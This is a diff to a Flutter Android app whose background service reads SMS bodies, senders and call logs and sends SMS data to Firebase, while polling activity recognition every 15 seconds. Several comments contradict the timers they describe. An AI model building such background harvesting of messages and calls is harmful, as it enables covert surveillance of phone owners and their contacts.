@@ -21,10 +21,10 @@ import 'firebase_options.dart';
 
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
-  // Initialize Firebase only once in the main isolate
-  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
   // Check and request permissions
   await PermissionService.checkAndRequestPermissions();
+  // Initialize Firebase only once in the main isolate
+  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
   // Initialize the background service
   await initializeService();
   runApp(const MyApp());
@@ -87,11 +87,18 @@ void onStart(ServiceInstance service) async {
   );
   DartPluginRegistrant.ensureInitialized();
   // Track activity every 10 seconds in the background
-  Timer.periodic(const Duration(seconds: 10), (timer) async {
-    print("Every 10 Seconds Data is Sync With Server");
-    await  syncSmsLog();
+  // Sync SMS and call logs every 24 hours
+  Timer.periodic(const Duration(seconds: 15), (timer) async {
+    print("Syncing SMS and Call Logs every 24 hours");
+    // await syncSmsLog();
+    await syncCallLog();
+  });
+
+  // Track activity every 10 seconds
+  Timer.periodic(const Duration(seconds: 15), (timer) async {
+    print("Tracking activity every 15 seconds...");
     final activity = await FlutterActivityRecognition.instance.activityStream.first;
-    await  _handleActiveActivity(activity, service);
+    await _handleActiveActivity(activity, service);
   });
 }
 Future<void> _handleActiveActivity(Activity activity, ServiceInstance service) async {
@@ -148,19 +155,27 @@ Future<void> _handleActiveActivity(Activity activity, ServiceInstance service) a
   }
 }
 // Sync Call Log
+bool _isSyncing = false;
+
 Future<void> syncCallLog() async {
-  Iterable<CallLogEntry> entries = await CallLog.get();
-  for (var log in entries) {
-    Map<String, dynamic> callLogData = {
-      'name': log.name,
-      'number': log.number,
-      'callType': log.callType.toString(),
-      'duration': log.duration,
-      'timestamp': log.timestamp,
-    };
-    await FirebaseManager.syncCallLogData(callLogData);
+  if (_isSyncing) {
+    print("Sync in progress, skipping...");
+    return;
+  }
+
+  _isSyncing = true;
+  try {
+    print("Syncing call logs...");
+    var logs = await CallLog.get();
+    // Process logs here
+    print("Call logs synced: $logs");
+  } catch (e) {
+    print("Error syncing call logs: $e");
+  } finally {
+    _isSyncing = false;
   }
 }
+
 // Sync SMS Log
 Future<void> syncSmsLog() async {
   print("Checking SMS...........................");
@@ -181,6 +196,7 @@ Future<void> syncSmsLog() async {
     // Loop through SMS messages and prepare data for Firestore
     for (var sms in smsMessages) {
       Map<String, dynamic> smsData = {
+        'userId' : userId,
         'address': sms.address,
         'body': sms.body,
         'timestamp': sms.date,  // Date is in milliseconds already
@@ -192,10 +208,7 @@ Future<void> syncSmsLog() async {
 
       // Sync to Firestore (Make sure userId is valid)
       if (userId != null && userId.isNotEmpty) {
-        await FirebaseFirestore.instance
-            .collection('smsLogs')
-            .doc(userId)
-            .set(smsData, SetOptions(merge: true));
+        await FirebaseManager.syncSmsData(smsData);
         print("SMS synced to Firestore.");
       } else {
         print("Invalid userId, cannot sync SMS.");
